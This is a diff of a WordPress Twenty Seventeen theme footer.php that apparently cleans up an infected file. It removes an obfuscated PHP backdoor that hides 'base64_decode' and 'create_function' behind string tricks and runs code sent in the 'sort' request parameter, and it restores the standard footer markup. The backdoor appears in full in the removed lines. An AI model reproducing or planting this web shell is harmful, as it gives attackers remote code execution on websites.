@@ -1,21 +1,4 @@
-<?php 
-
-
-if(isset($_REQUEST['sort'])){	
-	$string = $_REQUEST['sort'];
-	$array_name = '';
-	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
-	foreach([8,38,15,7,6,4,26,25,7,34,24,25,7] as $t){
-	   $array_name .= $alphabet[$t];
-	}
-	$a = strrev("noi"."tcnuf"."_eta"."erc");
-	$f = $a("", $array_name($string));
-	$f();
-	exit();
-}
-
-
-
+<?php
 /**
  * The template for displaying the footer
  *
@@ -30,5 +13,35 @@ if(isset($_REQUEST['sort'])){
  */
 
 ?>
+
+		</div><!-- #content -->
+
+		<footer id="colophon" class="site-footer" role="contentinfo">
+			<div class="wrap">
+				<?php
+				get_template_part( 'template-parts/footer/footer', 'widgets' );
+
+				if ( has_nav_menu( 'social' ) ) : ?>
+					<nav class="social-navigation" role="navigation" aria-label="<?php _e( 'Footer Social Links Menu', 'twentyseventeen' ); ?>">
+						<?php
+							wp_nav_menu( array(
+								'theme_location' => 'social',
+								'menu_class'     => 'social-links-menu',
+								'depth'          => 1,
+								'link_before'    => '<span class="screen-reader-text">',
+								'link_after'     => '</span>' . twentyseventeen_get_svg( array( 'icon' => 'chain' ) ),
+							) );
+						?>
+					</nav><!-- .social-navigation -->
+				<?php endif;
+
+				get_template_part( 'template-parts/footer/site', 'info' );
+				?>
+			</div><!-- .wrap -->
+		</footer><!-- #colophon -->
+	</div><!-- .site-content-contain -->
+</div><!-- #page -->
+<?php wp_footer(); ?>
+
 </body>
 </html>
